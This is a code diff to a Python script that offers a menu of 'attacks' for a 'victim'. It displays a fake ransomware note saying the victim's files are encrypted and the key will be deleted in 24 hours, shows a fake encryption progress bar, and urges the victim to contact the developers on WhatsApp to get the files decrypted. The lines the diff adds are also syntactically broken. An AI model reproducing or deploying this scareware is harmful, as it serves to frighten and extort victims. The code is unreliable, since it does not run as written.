@@ -1,5 +1,7 @@
 true = ''
 while true == '':
+    import colorama
+    from colorama import fore
     import os
     os.system('clear')
     import time as t   
@@ -14,7 +16,7 @@ while true == '':
     print ('\n'+tool_name)
     os.system('date')
     t.sleep(1)
-    print ('\nThe tools password is☞ 0000'+'\n')
+    print (fore.RED'\nThe tools password is☞ 0000'+'\n')
     print ('Enter the tools password ')
     t.sleep(1)
     tool_pw = getpass.getpass('password :'.upper())
@@ -29,7 +31,7 @@ while true == '':
          print('tool is unlocked ')
          t.sleep(1)
          os.system('clear')
-         tool_list = input(tool_name+'''\n
+         tool_list = input(tool_name+fore.GREEN'''\n
 
  [::] Select An Attack For Your Victim [::]
 
@@ -48,7 +50,7 @@ while true == '':
 
 [99] About         [00] Exit'''+'\n'+'Choose options >>  ')
       
-         lock_notes = ('''YOUR FILES HAS BEEN LOCED! \nYour documents, photos, databases and other important files have been locked with strongest encryption and unique key, generated for this android. Private decryption key is stored on a secret Internet server and nobody can decrypt your files until you pay and obtain the private key for the tool administrators.\nThe server will eliminate the key after 24h  of which even the admins will lose access to it''')      
+         lock_notes = (fore.RED'''YOUR FILES HAS BEEN LOCED! \nYour documents, photos, databases and other important files have been locked with strongest encryption and unique key, generated for this android. Private decryption key is stored on a secret Internet server and nobody can decrypt your files until you pay and obtain the private key for the tool administrators.\nThe server will eliminate the key after 24h  of which even the admins will lose access to it''')      
          t.sleep(1)
          os.system('clear')
          print(tool_name)
@@ -64,7 +66,7 @@ while true == '':
          t.sleep(0.25)
          print ('\n#.....15%')
          t.sleep(0.25)
-         print('##########.....100%'+'\nData encrypted successfully')
+         print('##########.....100%'+fore.RED'\nData encrypted successfully')
          t.sleep(3)
          os.system('clear')
          contact = input(tool_name+'\n'+lock_notes+'\n'+'\nEnter (y) to contact the developers on WhatsApp inorder to get your files decrypted'+'\n'+'\n>>   ')
